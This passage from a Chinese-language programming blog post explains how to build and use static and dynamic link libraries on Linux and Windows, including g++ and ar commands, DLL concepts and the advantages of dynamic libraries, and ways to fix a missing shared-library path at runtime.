title=\"Linux静态链接库\"></a>Linux静态链接库</h3><p>Linux静态链接库的文件命名必须是<code>lib[libname].a</code>，Linux中创建一个静态链接库过程如下：</p>\n<ol>\n<li>将编译代码文件编译成对象文件：<code>g++ -c matrix.cpp -o matrix.o</code></li>\n<li>用ar工具打包成静态链接库<code>matrix.a</code>：<code>ar -crv libmatrix.a matrix.o</code></li>\n</ol>\n<p>使用静态链接库编译，需要保证<code>libmatrix.a</code>和<code>matrix.h</code>头文件在当前目录下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">g++ main.cpp -L . -lmatrix -o main</span><br></pre></td></tr></table></figure><br>生成的<code>main</code>可执行文件已经打包了<code>libmatrix.a</code>数据和程序，可以被移植后单独运行。</p>\n<h3 id=\"Windows静态链接库\"><a href=\"#Windows静态链接库\" class=\"headerlink\" title=\"Windows静态链接库\"></a>Windows静态链接库</h3><p>Windows下基于VS的开发模式下，要创建一个静态链接库只需要新建一个Static Library项目，然后在头文件<code>#include &quot;stdafx.h&quot;</code>，他用于生成一个预编译头文件<code>project.pch</code>和预编译类型文件<code>stdafx.obj</code>。在编译完成后，就会生成对应的<code>*.lib</code>文件了。</p>\n<p>使用静态链接库的时候，在头部加上：<code>#pragma comment(lib,&quot;matrix.lib&quot;)</code></p>\n<h2 id=\"动态链接库\"><a href=\"#动态链接库\" class=\"headerlink\" title=\"动态链接库\"></a>动态链接库</h2><p>在使用动态库的时候，往往提供两个文件：一个引入库(.lib)文件和一个DLL (.dll) 文件。虽然引入库的后缀名也是“lib”，但是，动态库的引入库文件和静态库文件有着本质上的区别，对一个DLL来说，其引入库文件(.lib)包含该DLL导出的函数和变量的符号名，而.dll文件包含该DLL实际的函数和数据。在使用动态库的情况下，在编译链接可执行文件时，只需要链接该DLL的引入库文件，该DLL中的函数代码和数据并不复制到可执行文件中，直到可执行程序运行时，才去加载所需的DLL，将该DLL映射到进程的地址空间中，然后访问DLL中导出的函数。这时，在发布产品时，除了发布可执行文件以外，同时还要发布该程序将要调用的动态链接库。</p>\n<p>Windows API中所有的函数都包含在DLL中，其中有3个最重要的DLL：</p>\n<ul>\n<li>Kernel32.dll：它包含那些用于管理内存、进程和线程的函数，例如CreateThread函数；</li>\n<li>User32.dll：它包含那些用于执行用户界面任务（如窗口的创建和消息的传送）的函数，例如 CreateWindow 函数；</li>\n<li>GDI32.dll：它包含那些用于画图和显示文本的函数。</li>\n</ul>\n<p>使用动态链接库的优点：</p>\n<ol>\n<li>可以用多种程序编写动态链接库：</li>\n</ol>\n<p>动态链接库文件是系统相关的，可以用熟悉的语言开发动态链接库，然后在不同的语言开发的应用程序种调用它。于是可以充分发挥各种语言的特性，针对特定模块功能选用不同的语言。</p>\n<ol>\n<li>节约磁盘和内存空间</li>\n</ol>\n<p>如果多个程序需要使用同样的功能，可以将共同的功能模块以动态链接库的形式提供，所以同样的程序在磁盘上只需要存在一份，节约了磁盘空间。另外，如果多个进程使用同一份动态连接库，操作系统将保证该份动态链接库文件只需要放入内存一次，他的内存空间可以被多个应用程序共享，也节约了内存空间。</p>\n<ol>\n<li>实现资源共享</li>\n</ol>\n<p>动态链接库可以包含对话框模板、字符串、图标和位图等多种资源，多个应用程序可以使用动态链接库来共享这些资源。在实际工作中，可以编写一个纯资源的动态链接库，供其他应用程序访问。因此动态链接库也被称为<strong>共享库</strong>。</p>\n<ol>\n<li>有助于实现应用程序的本地化</li>\n</ol>\n<p>如果产品需要提供多语言版本，那么就可以使用DLL来支持多语言。可以为每种语言创建一个只支持这种语言的动态链接库。</p>\n<ol>\n<li><p>提供二次开发的平台<br>在销售产品的同时，可以采用DLL的形式提供一个二次开发的平台，让用户可以利用该DLL调用其中实现的功能，编写符合自己业务需要的产品，从而实现二次开发。</p>\n</li>\n<li><p>增强产品的功能</p>\n</li>\n</ol>\n<p>在发布产品时，可以发布产品功能实现的动态链接库规范，让其他公司或个人遵照这个规范开发自己的DLL，以取代产品原有的DLL，让产品调用新的DLL，从而实现功能 的增强。在实际工作中，我们看到许多产品都提供了界面插件功能，允许用户动态地更换程序的界面，这就可以通过更换界面DLL来实现。</p>\n<ol>\n<li>简化项目管理</li>\n</ol>\n<p>在一个大型项目开发中，通常都是由多个项目小组同时开发，如果采用串行开发，则效率是非常低的。我们可以将项目细分，将不同功能交由各项目小组以多个DLL的方式实现，这样，各个项目小组就可以同时进行开发了。</p>\n<ol>\n<li>方便程序更新</li>\n</ol>\n<p>如果项目依赖的静态链接库更新了，则主程序需要整个重新更新。</p>\n<ol>\n<li>支持手动载入程序</li>\n</ol>\n<p>一般的静态库加载代码段都是操作系统自行完成的，无法人为控制。如果一些项目特别大，就需要有选择的载入一些库，而动态链接库允许开发者在运行时显示的加载，调用和释放某一部分代码。</p>\n<h3 id=\"Windows动态链接库\"><a href=\"#Windows动态链接库\" class=\"headerlink\" title=\"Windows动态链接库\"></a>Windows动态链接库</h3><p>Windows下可以用VS创建一个Dynamic Link Library项目来构建一个动态链接库。在Windows系统下的执行文件格式是PE格式，动态库需要一个<code>DllMain</code>函数做出初始化的入口，通常在导出函数的声明时需要有<code>_declspec(dllexport)</code>关键字，表明函数将输出为动态链接库。编译后生成<code>*.lib</code>，<code>*.dll</code>等文件。</p>\n<p>在使用动态库时，往往提供两个文件：一个导入库(<code>*.lib</code>，非必须) 和一个(<code>*.dll</code>)文件。</p>\n<p>导入库和静态库本质上的区别：静态库本身就包含了实际执行代码和地址符号表等数据。而对于导入库而言，其实际的执行代码位于动态库中，导入库只包含了地址符号表等，确保程序找到对应函数的一些基本地址信息。</p>\n<p>在调用动态链接库文件<code>*.dll</code>的时候，需要引入库的头文件（<em>.h），导入库文件（</em>.lib），并加上<code>#pragma comment(lib,&quot;matrix.lib&quot;)</code>，还需要把<code>*.dll</code>文件放在可执行文件的生成目录。</p>\n<h3 id=\"Linux动态链接库\"><a href=\"#Linux动态链接库\" class=\"headerlink\" title=\"Linux动态链接库\"></a>Linux动态链接库</h3><p>Linux下gcc编译的执行文件默认是ELF格式，不需要初始化入口，亦不需要函数做特别的声明，编写比较方便：<br><code>g++ -shared -fPIC main.cpp -o libmatrix.so</code>通过指定<code>-shared</code>参数，编译<code>matrix.cpp</code>生成<code>libmatrix.so</code>动态链接库文件。其中<code>-fPIC</code>参数是为了生成启示地址无关的动态库。详细原理见这篇文章:<a href=\"https://blog.csdn.net/foxriver_gjg1989/article/details/104432575\">关于 gcc/g++编译选项: -fPIC 功能的解释</a></p>\n<h3 id=\"动态链接库的隐式调用和显式调用\"><a href=\"#动态链接库的隐式调用和显式调用\" class=\"headerlink\" title=\"动态链接库的隐式调用和显式调用\"></a>动态链接库的隐式调用和显式调用</h3><p>动态链接库调用分为隐式调用和显式调用。隐式调用是运行时执行到某个函数，由操作系统去寻找并链接库；显式调用是开发者自己声明库文件的位置和函数名，手动加载代码段，控制代码执行和代码块的释放。</p>\n<blockquote>\n<p>由于对Windows平台C++的开发没有经验，Windows相关的DLL使用之后再整理</p>\n</blockquote>\n<h4 id=\"隐式调用-Linux\"><a href=\"#隐式调用-Linux\" class=\"headerlink\" title=\"隐式调用(Linux)\"></a>隐式调用(Linux)</h4><p>我们先就开篇的背景问题，用动态链接库写个完整的例子：</p>\n<p><code>g++ -shared -fPIC -o libmatrix.so matrix.cpp</code> 通过指定<code>-shared</code>参数，编译<code>matrix.cpp</code>生成<code>libmatrix.so</code>动态链接库文件，接着用<code>matrix g++ -o main main.cpp -L . -lmatrix</code>生成可执行文件<code>main</code>，其中<code>-L .</code>指定动态链接库目录为当前目录，<code>-lmatrix</code>指明需要动态链接的库，编译器会自动去寻找<code>libmatrix.so</code>。</p>\n<p>编译链接成功后，但执行可执行程序<code>main</code>报错：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./main: error while loading shared libraries: libmatrix.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><br>提示链接器找不到<code>libmatrix.so</code>，用<code>ldd main</code>检查<code>main</code>种动态链接库的完整性：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ldd main</span><br><span class=\"line\">linux-vdso.so.1 (0x00007fffd9366000)</span><br><span class=\"line\">libmatrix.so =&gt; not found</span><br><span class=\"line\">libstdc++.so.6 =&gt; /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f611ccc0000)</span><br><span class=\"line\">libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f611cca0000)</span><br><span class=\"line\">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f611caa0000)</span><br><span class=\"line\">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f611c951000)</span><br><span class=\"line\">/lib64/ld-linux-x86-64.so.2 (0x00007f611ceca000)</span><br></pre></td></tr></table></figure><br>果然是运行时找不到<code>libmatrix.so</code>，这里有几种方式解决动态链接库的路径问题：</p>\n<ul>\n<li>设置LD_LIBRARY_PATH环境变量：<code>export LD_LIBRARY_PATH=$(pwd)</code></li>\n<li>向<code>/etc/ld.so.conf</code>中添加一行路径，然后执行<code>sudo ldconfig</code></li>\n<li>将<code>libmatrix.so</code>拷贝到默认动态链接库目录<code>/usr/local/lib</code></li>\n</ul>\n<p>修复完路径后，再次执行<code>main</code>就可以正常运行了。上述这样的一个过程就是隐式调用，隐式调用的优点是方便，实现简单。缺点是灵活性不足，如果一个程序模块特别多，启动时库全部加载，会严重拖慢启动时间。而且一些方法之后很少时间会用到，他们大部分时间可以被主动释放掉，从而减少内存占用。</p>\n<h4 id=\"显式调用-linux\"><a href=\"#显式调用-linux\" class=\"headerlink\" title=\"显式调用(linux)\"></a>显式调用(linux)</h4><p>详见：<a href=\"https://www.cnblogs.com/testlife007/p/10774271.html\">linux下动态链接库(.so)的显式调用和隐式调用</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"http://c.biancheng.net/view/228.html\">什么是函数指针</a></li>\n<li><a href=\"https://docs.microsoft.com/zh-CN/troubleshoot/windows-client/deployment/dynamic-link-library\">Mircosoft Doc: 什么是DLL</a></li>\n<li><a href=\"https://www.cnblogs.com/M-Anonymous/p/9520276.html\">动态链接库(DLL)</a></li>\n<li><a href=\"https://blog.csdn.net/liaoshenhao/article/details/101639417\">CSDN:动态链接库</a></li>\n<li><a href=\"https://www.cnblogs.com/lit10050528/p/3733381.html\">第十九讲：动态链接库</a></li>\n<li><a href=\"https://blog.csdn.net/inrgihc/article/details/49283157\">Linux下的静态链接库和动态链接库编程</a></li>\n<li><a href=\"https://www.cnblogs.com/testlife007/p/10774271.html\">linux下动态链接库(.so)的显式调用和隐式调用</a></li>\n</ul>\n"}]